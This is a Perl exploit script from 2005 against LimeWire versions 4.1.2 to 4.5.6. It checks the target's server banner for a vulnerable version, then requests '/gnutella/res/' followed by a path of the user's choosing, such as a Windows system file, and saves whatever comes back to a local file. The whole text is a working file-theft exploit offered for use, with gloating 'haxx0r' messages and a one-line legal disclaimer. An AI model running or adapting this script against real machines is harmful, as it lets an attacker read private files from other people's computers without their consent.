#!/usr/bin/perl
#
# exploits LimeWire 4.1.2 - 4.5.6
# http://www.packetstormsecurity.nl/0503-exploits/limewire480.txt
#
# This is just a quick and dirty script to grab textfiles. Doesn't work on binaries.
#
# Note: Using this code to 'hack' LimeWire clients other than your own is illegal and should NOT be done!
# 
# (c)2005 Marco van Berkum

use IO::Socket;

if(!$ARGV[2] || $ARGV[1] !~ /\\/) {
	die "Usage: ./limehack.pl host \"file you want\" outputfile [nondefaultport if needed]\n\nExample: ./limehack.pl 127.0.0.1 \"C:\\Windows\\win.ini\" win.ini \(don\'t forget the quotes\)\nUse the silly DOS way when requesting files with spaces, Progra~1 etc..\n\n";
}

$host = $ARGV[0];
$file = $ARGV[1];
$outputfile = $ARGV[2];
$port = $ARGV[3];
$readtimeout = "15"; # set longer for big files

if(!$port) { $port = 6346; }

# open sock
my $sock = new IO::Socket::INET (PeerAddr => $host, PeerPort => $port, Proto => 'tcp', Timeout => '5') || die "Connection refused\n";

# wheee socket;
if($sock) {
	print $sock "HEAD ?\n\n";
	sleep(5);
	sysread($sock, $buff, 1000);
	close($sock);
}

($temp, $server, $temp) = split(/Request|Content-Type/,$buff);
undef($buff);
($temp, $version) = split(/Server: /,$server);
chomp($version);

if($version =~ /limewire/i) {
	($temp, $versionnodots) = split(/\//,$version);
	$versionnodots =~ s/\.//g;
	if($versionnodots >= 412 && $versionnodots <= 456) {
	print("Vulnerable LimeWire!\n");
	} else { die "Not a vulnerable LimeWire server \:\(\n"; }

}  else { die "Not a LimeWire server!\n" }

print "Requesting file: $file.....\n";
my $sock = new IO::Socket::INET (PeerAddr => $host, PeerPort => $port, Proto => 'tcp', Timeout => '5') || die "Connection refused, host died?\n";

# wheee socket;
if($sock) {
	print $sock "GET /gnutella/res/$file HTTP/1.1\n\n";

	sleep($readtimeout);
	sysread($sock, $buff, 9999999);
}

if($buff =~ /200 OK/) {
	print "\nGot it!\nYUO ARE TEH HAX0R NOW!!!1111oneoneone\n";
	print "Thanks for using teh LimeWire haxx0rpr0ggie, the file is saved as $outputfile!\n";
	($temp, $data) = split(/Content-Length:.*/,$buff);
	$data =~ s/^\n//g;
	open FILE, ">$outputfile";
	print FILE "$data";
	close FILE;
} else {
print "File not found!\n";
}
